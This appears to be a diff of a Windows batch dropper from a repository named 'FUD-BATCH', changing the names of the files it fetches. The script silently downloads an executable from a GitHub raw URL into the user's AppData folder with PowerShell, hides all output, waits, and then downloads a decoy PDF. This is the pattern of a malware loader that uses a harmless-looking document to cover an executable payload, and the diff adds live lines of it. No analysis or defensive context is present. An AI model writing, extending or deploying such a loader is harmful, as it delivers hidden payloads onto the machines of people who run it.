@@ -2,8 +2,8 @@
 setlocal
 
 :: Set the download URL and the target path for 3.exe
-set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Ex.exe"
-set "output1=C:\Users\%USERNAME%\AppData\Ex1.exe" 
+set "url1=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/pump.exe"
+set "output1=C:\Users\%USERNAME%\AppData\\pu.exe" 
 
 :: Download the 3.exe file using PowerShell silently
 powershell -command "Invoke-WebRequest -Uri '%url1%' -OutFile '%output1%'" >nul 2>&1
@@ -38,7 +38,7 @@ timeout /t 10 /nobreak >nul 2>&1
 
 :: Set the download URL and the target path for Client.pdf
 set "url2=https://raw.githubusercontent.com/altabross/FUD-BATCH/refs/heads/main/Client.pdf"
-set "output2=C:\Users\%USERNAME%\AppData\Local\sample.pdf"
+set "output2=C:\Users\%USERNAME%\AppData\Local\sam.pdf"
 
 :: Download the Client.pdf file using PowerShell silently
 powershell -command "Invoke-WebRequest -Uri '%url2%' -OutFile '%output2%'" >nul 2>&1
